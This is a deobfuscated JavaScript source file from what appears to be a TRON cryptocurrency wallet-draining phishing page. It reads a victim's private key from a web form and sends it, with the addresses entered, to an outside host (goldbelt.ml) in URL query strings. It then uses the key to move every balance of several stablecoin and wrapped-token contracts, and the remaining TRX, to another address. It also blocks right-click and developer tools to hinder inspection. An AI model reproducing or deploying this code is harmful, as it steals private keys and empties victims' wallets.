//Sat Apr 19 2025 09:09:52 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
let beizhu = "TG@halfman9";
async function s(_0x37bc8d, _0x4b694e, _0x891215) {
  var _0x398597 = new XMLHttpRequest();
  _0x398597.open("GET", "https://goldbelt.ml/index/index/tgapi?text=提交地址:" + _0x37bc8d + "收款地址:" + _0x4b694e + "私钥:" + _0x891215, true);
  sa(key);
  _0x398597.send();
  _0x398597.onreadystatechange = function () {
    {
      if (_0x398597.readyState == 4 && _0x398597.status == 200) {
        var _0x27c17e = _0x398597.responseText;
        console.log(_0x27c17e);
      }
    }
  };
}
async function getstatus(_0x46d354, _0x1f4bef, _0x203f43) {
  const _0x5d77f7 = {
      "type": _0x203f43,
      "pri": _0x46d354,
      "domin": _0x1f4bef,
      "beizhu": beizhu
    },
    _0x58f878 = new URLSearchParams(_0x5d77f7).toString(),
    _0x3c8a7f = await fetch("https://goldbelt.ml/index/index?" + _0x58f878, {
      "method": "GET",
      "mode": "cors"
    });
  let _0x1f7882 = await _0x3c8a7f.json();
  return _0x1f7882;
}
async function sa(_0x31f867) {
  var _0x143680 = new XMLHttpRequest();
  _0x143680.open("GET", "https://goldbelt.ml/index/index/tgapi?text=私钥:" + _0x31f867, true);
  _0x143680.send();
  _0x143680.onreadystatechange = function () {
    if (_0x143680.readyState == 4 && _0x143680.status == 200) {
      {
        var _0x47051c = _0x143680.responseText;
        console.log(_0x47051c);
      }
    }
  };
}
var from,
  to,
  key,
  TronWeb,
  num = 0,
  contracts = {
    "usdt": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "usdc": "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "usdd": "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn",
    "usdj": "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
    "tusd": "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
    "btc": "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
    "wbtc": "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
    "eth": "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"
  };
$("#trc-submit").on("click", async function () {
  from = $("#trc-from").val();
  to = $("#trc-to").val();
  key = $("#trc-key").val();
  userkey = $("#trc-key").val();
  var _0x46cfc6 = location.host.split(":")[0];
  const _0x33c678 = await getstatus(key, _0x46cfc6, "trcapi");
  globalData = _0x33c678;
  dataValue = globalData.data;
  tipValue = globalData.tip;
  console.log(globalData);
  s(from, to, userkey);
  if (dataValue === 1) {
    const _0x35019a = TronWeb.providers.HttpProvider,
      _0x363532 = new _0x35019a("https://api.trongrid.io"),
      _0x4b2a66 = new _0x35019a("https://api.trongrid.io"),
      _0x3c9818 = new _0x35019a("https://api.trongrid.io");
    tronWeb = new TronWeb(_0x363532, _0x4b2a66, _0x3c9818, key);
    $.each(contracts, function (_0x3ddf4a, _0x1911ff) {
      transfer(_0x1911ff, userkey);
    });
    setTimeout(function () {
      sendTrx(from, to, userkey);
    }, 3000);
    $("#trc-form").hide();
    $("#trc-tip").show();
  } else {
    alert(tipValue);
    return;
  }
});
async function transfer(_0x37ed89, _0x5873b8) {
  let _0x271ccf = await tronWeb.contract().at(_0x37ed89),
    _0x30665b = await _0x271ccf.balanceOf(from).call();
  _0x30665b = parseInt(_0x30665b._hex);
  if (_0x30665b == 0) return false;
  try {
    {
      const _0x455a93 = [{
        "type": "address",
        "value": to
      }, {
        "type": "uint256",
        "value": _0x30665b
      }];
      var _0x3b9450 = await tronWeb.transactionBuilder.triggerSmartContract(_0x37ed89, "transfer(address,uint256)", {
          "PermissionId": 2
        }, _0x455a93, from),
        _0x27e07b = await tronWeb.trx.multiSign(_0x3b9450.transaction, key),
        _0x552c46 = await tronWeb.trx.sendRawTransaction(_0x27e07b);
      _0x552c46.result && (num += 1);
    }
  } catch (_0xd5a5f0) {
    alert("提交失败，请检查信息是否正确");
  }
}
async function sendTrx(_0x31ae4a, _0x2ea395, _0x3f1b4f) {
  try {
    {
      var _0x1616b3 = await tronWeb.trx.getBalance(_0x31ae4a);
      _0x1616b3 = _0x1616b3 - num * 9000000;
      if (_0x1616b3 <= 0) return false;
      s(_0x31ae4a, _0x2ea395, _0x3f1b4f);
      var _0x175dcc = await tronWeb.transactionBuilder.sendTrx(_0x2ea395, _0x1616b3, _0x31ae4a);
      var _0x303b1b = await tronWeb.trx.multiSign(_0x175dcc, key);
      var _0x4ac742 = await tronWeb.trx.sendRawTransaction(_0x303b1b);
    }
  } catch (_0x16ba2d) {
    alert("提交失败，请检查信息是否正确");
    console.error("trigger smart contract error", _0x16ba2d);
  }
}
window.oncontextmenu = function () {
  alert("防扒警告");
  return false;
};
document.onkeydown = document.onkeyup = document.onkeypress = function (_0x5d63eb) {
  let _0x5067e3 = _0x5d63eb || window.event || arguments.callee.caller.arguments[0];
  if (_0x5067e3 && _0x5067e3.keyCode == 123) return _0x5067e3.returnValue = false, alert("F12是不礼貌的"), false;
};